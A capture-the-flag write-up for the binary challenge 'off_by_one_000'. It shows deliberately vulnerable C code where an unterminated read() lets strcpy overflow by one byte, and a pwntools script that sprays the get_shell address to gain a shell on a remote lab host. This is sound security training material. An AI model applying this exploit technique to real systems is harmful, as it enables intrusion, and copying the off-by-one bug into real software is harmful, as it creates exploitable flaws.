# Write-up of the challenge "off_by_one_000"

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to use the knowledge of how **strcpy** and **read** works in depth to exploit the extra offset by one by the **strcpy**.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell()
{
    system("/bin/sh");
}

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int cpy()
{
    char real_name[256];
    strcpy(real_name, cp_name);
    return 0;
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name));

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}


```

## Security breach

The vulnerability here is that it does not add any null byte at the end:

```
    read(0, cp_name, sizeof(cp_name));
```

## Solution

As we can see in this read, it does not add any null byte at the end:

```
    read(0, cp_name, sizeof(cp_name));
```

The strcpy will read till it finds a null byte so in the end it will read **one more** than **the buffer**. This reading can cause the stack to shift and point somewhere else, maybe it can shift it to point anywhere in the buffer. So the solution is just to put the most amount of **get_shell** in this buffer so no matter where it will point it will always point to the **get_shell**. Because each address is 4 and the buffer is 256 we can do some math 256 / 4 and find out that we can send at most 64 address of **get_shell**.

solve.py:

```
from pwn import *

# p = process('./off_by_one_000')
p = remote('host8.dreamhack.games', 8793)

# 256 / 4 = 64

shell = 0x080485db

payload = p32(0x080485db) * 64

p.sendline(payload)

p.interactive()

```
